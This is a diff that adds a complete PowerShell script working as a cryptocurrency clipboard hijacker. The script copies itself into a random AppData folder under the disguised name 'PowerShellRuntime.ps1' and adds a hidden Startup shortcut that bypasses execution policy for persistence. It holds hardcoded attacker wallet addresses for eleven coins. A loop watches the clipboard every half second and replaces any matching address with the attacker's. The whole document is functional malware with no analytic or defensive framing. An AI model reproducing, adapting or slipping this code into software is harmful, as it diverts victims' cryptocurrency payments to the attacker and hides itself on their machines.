@@ -1,0 +1,81 @@
+$env:APPDATA = [Environment]::GetFolderPath("ApplicationData")
+$scriptPath = $MyInvocation.MyCommand.Path
+$startupFolder = [Environment]::GetFolderPath("Startup")
+$shortcutPath = Join-Path $startupFolder "PowerShellRuntime.lnk"
+
+if (-not (Test-Path $shortcutPath)) {
+    $scriptContent = Get-Content -Path $scriptPath -Raw
+    $folders = Get-ChildItem -Path $env:APPDATA -Directory
+    if ($folders.Count -gt 0) {
+        $selectedFolder = $folders | Get-Random
+        $copyPath = Join-Path $selectedFolder.FullName "PowerShellRuntime.ps1"
+        $scriptContent | Out-File -FilePath $copyPath -Encoding UTF8
+        $WshShell = New-Object -comObject WScript.Shell
+        $Shortcut = $WshShell.CreateShortcut($shortcutPath)
+        $Shortcut.TargetPath = "powershell.exe"
+        $Shortcut.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$copyPath`""
+        $Shortcut.Save()
+    }
+}
+
+$wallets = @{
+    'BTC' = 'bc1qzuelyf68hjd8qwhsm43ejpk538xnvd78zml5d3'
+    'LTC' = 'LX44QNxXmmnUsttkzdAgMubS6dQb7nHNha'
+    'ETH' = '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b'
+    'SOL' = 'F7Lr2NjDPWPMJouTHV3kasePbiL4t1MrtCCMbUgCZXYj'
+    'BCH' = 'qz77pfwc0xgd0up2qxds2ytrsjnka9qgmcmzxntjfz'
+    'TRX' = 'TQw5weBndhXq9mLkPDwBXeDWb7vcVDGTUk'
+    'XRP' = 'rGU8BRSuY5YLNdUcXbrNu29EQHRCR8wRSo'
+    'ADA' = 'addr1qydvdugxkprrxsfxzf2r0amkz0syka5lm8spk4vgv9l0y7c6cmcsdvzxxdqjvyj5xlmhvylqfdmflk0qrd2csct77fasq5cfzg'
+    'DOGE' = 'DBBaxUBzXAZqnbaHZk8CbpZ6CVGmC1Euvn'
+    'XLM' = 'GA6NFYTV4GMS7YW6UQHRGSTSXACYRUK4O3Q5IKMVA62SRA4VRNKNABEY'
+    'ATOM' = 'cosmos12d2at6hs2ewzksyfvt0a0fwqcvymm5zzj2648d'
+}
+
+$cryptoRegex = '(?xi)
+\b(
+    (?<BTC> (bc1[qp][a-z0-9]{39,59}|[13][a-km-zA-HJ-NP-Z1-9]{25,34}) )
+  | (?<LTC> (ltc1[qp][a-z0-9]{39,59}|[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}) )
+  | (?<ETH> (0x[a-fA-F0-9]{40}) )
+  | (?<SOL> ([1-9A-HJ-NP-Za-km-z]{32,44}) )
+  | (?<BCH> ((bitcoincash:)?(q|p)[a-z0-9]{41}) )
+  | (?<TRX> (T[1-9A-HJ-NP-Za-km-z]{33}) )
+  | (?<XRP> (r[1-9A-HJ-NP-Za-km-z]{24,34}) )
+  | (?<ADA> (addr1[0-9a-z]{58,104}) )
+  | (?<DOGE> (D{1}[5-9A-HJ-NP-Ua-km-zA-HJ-NP-Z1-9]{32,33}) )
+  | (?<XLM> (G[A-Z2-7]{55}) )
+  | (?<ATOM> (cosmos1[a-z0-9]{38}) )
+)\b
+'
+
+while ($true) {
+    try {
+        $text = Get-Clipboard -ErrorAction SilentlyContinue | Out-String
+        if ($text) {
+            $pattern = if ($cryptoRegex -is [regex]) { $cryptoRegex } else { [regex]$cryptoRegex }
+            $replaced = $pattern.Replace($text, {
+                param($m)
+                $originalAddr = $m.Value
+                $coin = $null
+                if ($m.Groups['BTC'].Success) { $coin = 'BTC' }
+                elseif ($m.Groups['LTC'].Success) { $coin = 'LTC' }
+                elseif ($m.Groups['ETH'].Success) { $coin = 'ETH' }
+                elseif ($m.Groups['SOL'].Success) { $coin = 'SOL' }
+                elseif ($m.Groups['BCH'].Success) { $coin = 'BCH' }
+                elseif ($m.Groups['TRX'].Success) { $coin = 'TRX' }
+                elseif ($m.Groups['XRP'].Success) { $coin = 'XRP' }
+                elseif ($m.Groups['ADA'].Success) { $coin = 'ADA' }
+                elseif ($m.Groups['DOGE'].Success) { $coin = 'DOGE' }
+                elseif ($m.Groups['XLM'].Success) { $coin = 'XLM' }
+                elseif ($m.Groups['ATOM'].Success) { $coin = 'ATOM' }
+                if ($coin -and $wallets.ContainsKey($coin)) {
+                    return [string]$wallets[$coin]
+                } else {
+                    return $originalAddr
+                }
+            })
+            Set-Clipboard $replaced -ErrorAction SilentlyContinue
+        }
+    } catch {}
+    Start-Sleep -Milliseconds 500
+}
